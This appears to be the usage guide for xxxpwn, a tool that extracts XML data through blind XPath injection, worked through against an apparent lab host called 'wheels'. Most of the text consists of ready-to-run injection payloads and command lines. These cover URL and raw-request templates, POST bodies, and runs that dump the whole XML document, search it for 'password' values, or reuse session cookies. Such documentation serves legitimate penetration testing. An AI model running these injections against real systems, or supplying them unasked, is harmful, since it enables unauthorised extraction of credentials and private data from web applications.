# xxxpwn Usage Guide

xxxpwn performs blind XPath injection using a Binary Search Tree (BST) approach.
Instead of returning data directly, it asks the server a series of true/false
questions — "is the first character of this node's name less than 'm'?" — and
narrows down the answer with each request.

---

## Quickstart: injecting into `work`

Target: `http://wheels/portal.php?work=car&action=search`

The `work` parameter is injectable. To inject, you need to break out of the
current XPath string context and append your own boolean expression:

```
' or INJECT and '1'='1
```

Substituting `INJECT` with something always-true (`1=1`) should produce the same
response as a valid search. Substituting something always-false (`0=1`) should
produce a different response (empty result, error, redirect, etc.).

There are two ways to run xxxpwn: **URL mode** (quick) and **inject file mode**
(full control).

---

### URL mode (quickstart)

Pass the target URL with `$INJECT` placed directly in the parameter value.
xxxpwn derives the host, port, and SSL settings automatically — no inject file
needed.

```bash
xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
       -m "result"
```

`$INJECT` is the placeholder xxxpwn replaces on every request.
The `+` signs are URL-encoded spaces (required for GET parameters).

For HTTPS, just use `https://` — SSL is detected from the scheme:

```bash
xxxpwn --url "https://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
       -m "result"
```

> **Note:** `--url` cannot be combined with `-i`/`--inject`, `-s`/`--ssl`,
> or the positional `host`/`port` args — they are all derived from the URL.

---

### Inject file mode (full control)

Use this when you need to inject into a POST body, SOAP envelope, custom
headers, or anywhere a raw URL won't cut it.

#### 1. Create the inject file

Save this as `inject_wheels.txt`:

```
GET /portal.php?work=car'+or+$INJECT+and+'1'='1&action=search HTTP/1.1
Host: wheels

```

#### 2. Run

```bash
xxxpwn -i inject_wheels.txt -m "result" wheels 80
```

> **Note:** If the parameter is URL-decoded before XPath evaluation you may need
> `-U` to URL-encode the injected payload as well. Test both.

---

### Find your match string

Run a normal request in your browser or with curl and identify a string that
appears in the **successful** response but not in an error/empty response.
For example, if a successful search returns a page containing the word `result`:

```
-m "result"
```

### Sanity checks

xxxpwn automatically runs two checks before doing anything:

| Test | XPath injected | Expected |
|------|---------------|----------|
| True injection | `count(//*) and 2>1` | match found |
| False injection | `0>1` | no match |

If either check fails, xxxpwn exits with an error. Common fixes:

- Add `-U` if the parameter is double-encoded
- Add `-H` if the payload is in an HTML/XML body (e.g. SOAP)
- Adjust the injection syntax in your URL or inject file

### Dump the full XML document

Both modes walk the entire XML tree and print it incrementally to stdout,
then pretty-print the full document at the end.

---

## Common scenarios

### Speed up extraction with threads

Each thread finds one character concurrently. 4–8 threads is a good starting point.

```bash
# URL mode
xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
       -m "result" -t 4

# Inject file mode
xxxpwn -t 4 -i inject_wheels.txt -m "result" wheels 80
```

### Search for a specific value without dumping everything

Useful when you already know what you're looking for (usernames, passwords, etc.).

```bash
xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
       -m "result" --search "password"

xxxpwn --search "password" -i inject_wheels.txt -m "result" wheels 80
```

Returns every node name, attribute name, attribute value, comment, and text node
that contains the search string.

### Inject session cookies

If the endpoint requires authentication:

```
# cookies.txt
PHPSESSID=abc123
auth=bearer_token_here
```

```bash
# URL mode
xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
       -m "result" -C cookies.txt

# Inject file mode
xxxpwn -C cookies.txt -i inject_wheels.txt -m "result" wheels 80
```

### Reduce requests with optimizations

`-g` counts all nodes globally up front (costs a few requests but skips
per-node zero-checks later). `-o` probes which characters actually appear in
the document and shrinks the BST search space. `-x` matches node names against
previously seen names instead of re-extracting them character by character.

```bash
xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
       -m "result" -gnox -t 4

xxxpwn -gnox -t 4 -i inject_wheels.txt -m "result" wheels 80
```

| Flag | What it does |
|------|-------------|
| `-g` | Global node count (skip zero-checks mid-tree) |
| `-n` | Normalize whitespace in node values |
| `-o` | Optimize character set globally and per long string |
| `-x` | Match node names against previously recovered names |

### Lowercase-only targets

If the XML uses only lowercase node names and values, strip uppercase from the
character set and use XPath `translate()` for comparisons — roughly halves the
number of requests:

```bash
xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
       -m "result" -l

xxxpwn -l -i inject_wheels.txt -m "result" wheels 80
```

### Start at a specific node

If you already know part of the tree structure:

```bash
xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
       -m "result" --start_node "/*[1]/*[2]"

xxxpwn --start_node "/*[1]/*[2]" -i inject_wheels.txt -m "result" wheels 80
```

### Test a payload interactively

Use `-e` to fire a single injection and see the full request/response:

```bash
xxxpwn --url "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search" \
       -m "result" -e "1=1"

xxxpwn -e "1=1" -i inject_wheels.txt -m "result" wheels 80
xxxpwn -e "0=1" -i inject_wheels.txt -m "result" wheels 80
```

---

## POST / SOAP targets

For POST bodies, include the full request in your inject file and add `-H` to
HTML-encode the payload (required when `$INJECT` sits inside an XML body):

```
POST /portal.php HTTP/1.1
Host: wheels
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

work=car'+or+$INJECT+and+'1'='1&action=search
```

```bash
xxxpwn -H -t 4 -i inject_wheels_post.txt -m "result" wheels 80
```

xxxpwn automatically recalculates `Content-Length` on every request.

---

## Full flag reference

```
xxxpwn [OPTIONS] [HOST] [PORT]

Input (one of these two forms required):
  --url <URL>              Full URL with $INJECT in the target parameter.
                           Derives host, port, and SSL from the URL.
                           Cannot be combined with -i, -s, host, or port.
  -i, --inject <FILE>      Raw HTTP request template with $INJECT placeholder.
                           Requires host and port positional args.

Required:
  -m, --match  <PATTERN>   Regex matched against the response to detect true

Connection:
  -s, --ssl                Use TLS (inject file mode only; auto-detected with --url)
  -C, --cookies <FILE>     Cookie file (one name=value per line, # for comments)

Encoding:
  -U, --urlencode          URL-encode the injected payload
  -H, --htmlencode         HTML-encode the injected payload

Optimizations:
  -t, --threads <N>        Parallel character discovery threads (default: 0)
  -l, --lowercase          Assume target is lowercase-only
  -g, --global_count       Count all nodes up front
  -n, --normalize_space    Normalize whitespace
  -o, --optimize_charset   Shrink character set to only chars present in doc
  -x, --xml_match          Match node names against previously seen names

Scope:
  --no_root                Skip root-level comments/PIs
  --no_comments            Skip comment nodes
  --no_processor           Skip processing-instruction nodes
  --no_attributes          Skip attributes
  --no_values              Skip attribute values
  --no_text                Skip text nodes
  --no_child               Skip child nodes

BST tuning:
  --len_low  <N>           Low bound for string-length BST (default: 0)
  --len_high <N>           High bound for string-length BST (default: 16)
  --start_node <XPATH>     Start recovery at this node (default: /*[1])
  -u, --use_characters <S> Custom character set string

Search / test:
  --search <STRING>        Search all node types for string, then exit
  --search_start           Use starts-with instead of contains for --search
  -e, --example <PAYLOAD>  Fire one test injection and show request/response
  --summary                Print XML summary counts only, no content
  --xpath2                 Check if target supports XPath 2.0
  --unicode                Add extended Latin chars to search space
  -c, --case               Case-sensitive match (default: insensitive)
```
